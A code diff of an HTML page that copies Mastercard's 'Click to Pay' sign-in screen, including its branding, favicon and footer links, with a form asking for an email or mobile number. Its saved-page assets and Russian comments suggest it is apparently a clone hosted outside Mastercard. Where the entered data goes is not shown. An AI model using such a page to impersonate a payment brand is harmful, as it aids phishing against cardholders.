@@ -1,119 +1,116 @@
 <!DOCTYPE html>
 <html lang="en-US">
-  <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
-    <meta name="description" content="Create a payment profile or sign in with Click to Pay" />
-    <link rel="icon" href="https://src.mastercard.com/profile/favicon.ico" />
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
+  <meta name="description" content="Create a payment profile or sign in with Click to Pay" />
+  <link rel="icon" href="https://src.mastercard.com/profile/favicon.ico" />
+  <title>Click to Pay</title>
 
-    <!-- ✅ Подключаем стили напрямую -->
-    <link rel="stylesheet" href="style.css" />
-    <link rel="stylesheet" href="index_files/index.d9994029.css" />
+  <link rel="stylesheet" href="style.css" />
+  <link rel="stylesheet" href="index_files/index.d9994029.css" />
+</head>
+<body>
+  <div class="root-container">
+    <header class="header__wrapper">
+      <div class="container">
+        <div class="row row-space-between">
+          <div class="col-n header__brand">
+            <div class="header__brand__item header__brand__item--src header__brand__item--bordered">
+              <i role="img" aria-label="Mastercard Click to Pay Profile" class="icon-src"></i>
+            </div>
+            <div class="header__brand__item">
+              <i role="img" aria-label="mastercard" class="card-brand-logo--mastercard card-brand-logo--dark-support"></i>
+            </div>
+          </div>
+          <nav class="col header__nav">
+            <a href="#" class="header__item" role="button" tabindex="0">
+              <span>US</span><i class="icon-globe"></i>
+            </a>
+          </nav>
+        </div>
+      </div>
+    </header>
 
-    <title>Click to Pay</title>
-  </head>
-  <body>
-    <div class="root-container">
-      <!-- Header -->
-      <header class="header__wrapper">
-        <div class="container">
-          <div class="row row-space-between">
-            <div class="col-n header__brand">
-              <div class="header__brand__item header__brand__item--src header__brand__item--bordered">
-                <i role="img" aria-label="Mastercard Click to Pay Profile" class="icon-src"></i>
-              </div>
-              <div class="header__brand__item">
-                <i role="img" aria-label="mastercard" class="card-brand-logo--mastercard card-brand-logo--dark-support"></i>
+    <main>
+      <div class="container">
+        <div class="row margin-bottom-sm">
+          <div class="col">
+            <h1 class="display-lg color-orange-high">Click to Pay</h1>
+            <h2 class="display-lg">The fast, secure way to pay online</h2>
+          </div>
+        </div>
+
+        <form id="login-form" class="container-fluid" novalidate>
+          <div class="row">
+            <div class="col-full">
+              <p>Create a profile or sign in</p>
+            </div>
+          </div>
+
+          <div class="row">
+            <div class="col">
+              <div class="al-input floating">
+                <input
+                  type="text"
+                  id="userId"
+                  name="userId"
+                  placeholder=" "
+                  class="al-input__input"
+                  required
+                />
+                <label for="userId" class="al-input__label">Email or mobile number</label>
+                <div class="al-input__subtext">
+                  We'll use this to verify your identity. Message/data rates may apply.
+                </div>
               </div>
             </div>
-            <nav class="col header__nav">
-              <a href="#" class="header__item" role="button" tabindex="0">
-                <span>US</span><i class="icon-globe"></i>
-              </a>
+          </div>
+
+          <div class="row-vertical-align-bottom">
+            <div class="col-full">
+              <div class="al-button">
+                <button
+                  type="submit"
+                  id="submit-btn"
+                  class="uppercase fill"
+                  aria-label="Continue"
+                  disabled
+                >
+                  <div class="al-button__dancing-dots">
+                    <div class="dancing-dot dancing-dot--1"></div>
+                    <div class="dancing-dot dancing-dot--2"></div>
+                    <div class="dancing-dot dancing-dot--3"></div>
+                  </div>
+                  <span class="al-button__label">Continue</span>
+                </button>
+              </div>
+            </div>
+          </div>
+        </form>
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="container">
+        <div class="row">
+          <div class="col">
+            <nav class="footer__nav">
+              <a href="https://www.mastercard.com/global/click-to-pay/en-us/terms-of-use.html" target="_blank" class="btn btn--footer uppercase">Terms</a>
+              <a href="https://www.mastercard.com/global/click-to-pay/en-us/privacy-notice.html" target="_blank" class="btn btn--footer uppercase">Privacy</a>
+              <a href="#" class="btn btn--footer uppercase">Cookies</a>
+              <a href="#" class="btn btn--footer uppercase">Feedback</a>
             </nav>
           </div>
         </div>
-      </header>
+      </div>
+    </footer>
+  </div>
 
-      <!-- Main -->
-      <main>
-        <div class="container">
-          <div class="row margin-bottom-sm">
-            <div class="col">
-              <h1 class="display-lg color-orange-high">Click to Pay</h1>
-              <h2 class="display-lg">The fast, secure way to pay online</h2>
-            </div>
-          </div>
-
-          <form id="login-form" class="container-fluid" novalidate>
-            <div class="row">
-              <div class="col-full">
-                <p>Create a profile or sign in</p>
-              </div>
-            </div>
-
-            <div class="row">
-              <div class="col">
-                <div class="al-input floating">
-                  <input
-                    type="text"
-                    id="userId"
-                    name="userId"
-                    placeholder=" "
-                    class="al-input__input"
-                    required
-                  />
-                  <label for="userId" class="al-input__label">Email or mobile number</label>
-                  <div class="al-input__subtext">
-                    We'll use this to verify your identity. Message/data rates may apply.
-                  </div>
-                </div>
-              </div>
-            </div>
-
-            <div class="row-vertical-align-bottom">
-              <div class="col-full">
-                <div class="al-button">
-                  <button
-                    type="submit"
-                    id="submit-btn"
-                    class="uppercase fill"
-                    aria-label="Continue"
-                    disabled
-                  >
-                    <div class="al-button__dancing-dots">
-                      <div class="dancing-dot dancing-dot--1"></div>
-                      <div class="dancing-dot dancing-dot--2"></div>
-                      <div class="dancing-dot dancing-dot--3"></div>
-                    </div>
-                    <span class="al-button__label">Continue</span>
-                  </button>
-                </div>
-              </div>
-            </div>
-          </form>
-        </div>
-      </main>
-
-      <!-- Footer -->
-      <footer class="footer">
-        <div class="container">
-          <div class="row">
-            <div class="col">
-              <nav class="footer__nav">
-                <a href="https://www.mastercard.com/global/click-to-pay/en-us/terms-of-use.html" target="_blank" class="btn btn--footer uppercase">Terms</a>
-                <a href="https://www.mastercard.com/global/click-to-pay/en-us/privacy-notice.html" target="_blank" class="btn btn--footer uppercase">Privacy</a>
-                <a href="#" class="btn btn--footer uppercase">Cookies</a>
-                <a href="#" class="btn btn--footer uppercase">Feedback</a>
-              </nav>
-            </div>
-          </div>
-        </div>
-      </footer>
-    </div>
-
-    <!-- ✅ JS -->
-    <script>
+  <!-- ✅ Подключение скрипта -->
+  <script src="main.js" type="module"></script>
+</body>
+</html>
       const input = document.getElementById('userId');
       const button = document.getElementById('submit-btn');
       const form = document.getElementById('login-form');
